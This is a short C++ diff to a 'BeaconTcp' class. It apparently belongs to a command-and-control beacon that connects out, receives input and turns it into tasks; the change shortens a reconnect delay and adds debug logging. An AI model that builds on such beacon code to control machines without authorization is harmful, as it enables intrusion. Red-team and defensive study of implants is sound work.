@@ -18,9 +18,11 @@ BeaconTcp::~BeaconTcp()
 
 void BeaconTcp::checkIn()
 {	
+	DEBUG("initConnection");
 	while(!m_client->initConnection())
 	{
-		Sleep(1000);
+		Sleep(333);
+		DEBUG("initConnection");
 	}
 
 	std::string output;
@@ -36,6 +38,7 @@ void BeaconTcp::checkIn()
 		if(res)
 		{
 			DEBUG("received input.size " << std::to_string(input.size()));
+
 			if(!input.empty())
 			{
 				cmdToTasks(input);
